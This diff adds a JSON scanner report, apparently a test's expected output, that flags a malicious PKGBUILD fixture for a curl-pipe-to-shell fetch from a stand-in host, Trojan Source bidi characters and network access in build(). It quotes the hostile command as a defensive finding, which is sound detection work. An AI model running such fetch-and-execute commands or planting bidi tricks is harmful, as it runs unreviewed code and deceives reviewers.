@@ -1,0 +1,108 @@
+{
+  "package_name": "bidi-trick",
+  "package_version": "1.0-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD",
+        "line": 8,
+        "column": 3,
+        "snippet": "  curl -s https://cdn.evil.example/x.sh | sh"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -s https://cdn.evil.example/x.sh | sh"
+      }
+    },
+    {
+      "id": "DEEP-003",
+      "severity": "critical",
+      "category": "obfuscation",
+      "title": "Unicode bidirectional control characters",
+      "description": "The file contains 2 Unicode bidi control character(s) (U+202E, U+202C). These change how the text is DISPLAYED without changing what is executed, so the code a reviewer reads can differ from the code that runs (Trojan Source, CVE-2021-42574). Shell source has no legitimate use for an explicit directional override.",
+      "location": {
+        "file": "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Strip the bidi characters and re-read the file before trusting any review of it.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "bidi_count": 2,
+        "codepoints": [
+          "U+202E",
+          "U+202C"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://cdn.evil.example/x.sh",
+      "description": "This package downloads and executes code from https://cdn.evil.example/x.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD",
+        "line": 8,
+        "column": null,
+        "snippet": "curl -s https://cdn.evil.example/x.sh | sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://cdn.evil.example/x.sh"
+        ]
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD",
+        "line": 6,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/bidi-trojan-source/PKGBUILD"
+  ],
+  "timestamp": "2026-11-10T14:50:54.813735948Z",
+  "scan_duration_ms": 19
+}
